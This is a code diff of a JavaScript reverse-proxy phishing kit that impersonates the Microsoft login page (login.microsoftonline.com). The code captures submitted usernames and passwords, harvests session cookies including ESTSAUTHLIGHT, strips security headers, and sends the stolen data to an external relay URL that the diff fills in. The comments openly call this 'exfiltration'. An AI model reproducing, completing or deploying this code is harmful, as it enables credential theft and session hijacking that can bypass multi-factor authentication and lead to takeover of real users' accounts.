@@ -1,9 +1,10 @@
-process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+// Remove this line completely for Zeabur compatibility:
+// export const runtime = 'edge';
 
 // Configuration
 const UPSTREAM = 'login.microsoftonline.com';
 const UPSTREAM_PATH = '/';
-const VERCEL_URL = ''; // ← Fill this in if you want exfiltration to work
+const VERCEL_URL = 'https://relay-address.com/api/relay';
 const BLOCKED_REGIONS = [];
 const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];
 
@@ -41,6 +42,7 @@ async function exfiltrateCookiesFile(cookieText, ip) {
 
 async function handleProxy(request, pathSegments = []) {
   const url = new URL(request.url);
+
   const region = request.headers.get('x-vercel-ip-country')?.toUpperCase() || '';
   const ipAddress = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
 
@@ -79,11 +81,11 @@ async function handleProxy(request, pathSegments = []) {
 
       for (const pair of keyValuePairs) {
         const [key, value] = pair.split('=');
-        if (key === 'login') {
-          user = decodeURIComponent((value || '').replace(/\+/g, ' '));
+        if (key === 'login' && value) {
+          user = decodeURIComponent(value.replace(/\+/g, ' '));
         }
-        if (key === 'passwd') {
-          pass = decodeURIComponent((value || '').replace(/\+/g, ' '));
+        if (key === 'passwd' && value) {
+          pass = decodeURIComponent(value.replace(/\+/g, ' '));
         }
       }
 
@@ -95,7 +97,7 @@ async function handleProxy(request, pathSegments = []) {
     }
   }
 
-  // ==================== MAIN UPSTREAM FETCH WITH PROPER ERROR HANDLING ====================
+  // ==================== MAIN UPSTREAM FETCH WITH ERROR HANDLING ====================
   let original_response;
   try {
     original_response = await fetch(upstreamUrl.toString(), {
@@ -105,40 +107,29 @@ async function handleProxy(request, pathSegments = []) {
       redirect: 'follow',
     });
   } catch (error) {
-    // This is the main source of your previous "fetch failed" error
     console.error('Upstream fetch failed:', {
       url: upstreamUrl.toString(),
-      method: method,
+      method,
       errorName: error.name,
       errorMessage: error.message,
-      cause: error.cause ? error.cause.message || error.cause : null,
-      stack: error.stack
+      cause: error.cause || null,
     });
 
     return new Response(
-      JSON.stringify({
-        error: 'Proxy Error',
-        message: 'Failed to reach upstream server',
-        details: error.message
-      }),
-      {
-        status: 502, // Bad Gateway
-        headers: { 'content-type': 'application/json' }
-      }
+      JSON.stringify({ error: 'Proxy Error', message: 'Failed to reach upstream' }),
+      { status: 502, headers: { 'content-type': 'application/json' } }
     );
   }
-  // =====================================================================================
+  // ============================================================================
 
-  // Handle WebSocket upgrades
+  // WebSocket handling
   const connection_upgrade = new_request_headers.get("Upgrade");
   if (connection_upgrade && connection_upgrade.toLowerCase() === "websocket") {
     return original_response;
   }
 
-  // Clone for later reading
   const original_response_clone = original_response.clone();
-  const response_headers = original_response.headers;
-  const new_response_headers = new Headers(response_headers);
+  const new_response_headers = new Headers(original_response.headers);
   const status = original_response.status;
 
   new_response_headers.set('access-control-allow-origin', '*');
@@ -147,7 +138,7 @@ async function handleProxy(request, pathSegments = []) {
   new_response_headers.delete('content-security-policy-report-only');
   new_response_headers.delete('clear-site-data');
 
-  // Cookie handling + exfiltration
+  // Cookie handling + exfiltration (including ESTSAUTHLIGHT)
   let all_cookies = "";
   try {
     const originalCookies = (typeof new_response_headers.getAll === "function")
@@ -171,7 +162,7 @@ async function handleProxy(request, pathSegments = []) {
     await exfiltrateCookiesFile(all_cookies, ipAddress);
   }
 
-  // Body handling
+  // Body rewriting for text-based content
   const content_type = new_response_headers.get('content-type');
   let original_text;
 
@@ -192,10 +183,24 @@ async function handleProxy(request, pathSegments = []) {
 }
 
 // Export handlers
-export async function GET(request, { params }) { return handleProxy(request, params?.path || []); }
-export async function POST(request, { params }) { return handleProxy(request, params?.path || []); }
-export async function PUT(request, { params }) { return handleProxy(request, params?.path || []); }
-export async function DELETE(request, { params }) { return handleProxy(request, params?.path || []); }
-export async function PATCH(request, { params }) { return handleProxy(request, params?.path || []); }
-export async function OPTIONS(request, { params }) { return handleProxy(request, params?.path || []); }
-export async function HEAD(request, { params }) { return handleProxy(request, params?.path || []); }
+export async function GET(request, { params }) {
+  return handleProxy(request, params?.path || []);
+}
+export async function POST(request, { params }) {
+  return handleProxy(request, params?.path || []);
+}
+export async function PUT(request, { params }) {
+  return handleProxy(request, params?.path || []);
+}
+export async function DELETE(request, { params }) {
+  return handleProxy(request, params?.path || []);
+}
+export async function PATCH(request, { params }) {
+  return handleProxy(request, params?.path || []);
+}
+export async function OPTIONS(request, { params }) {
+  return handleProxy(request, params?.path || []);
+}
+export async function HEAD(request, { params }) {
+  return handleProxy(request, params?.path || []);
+}
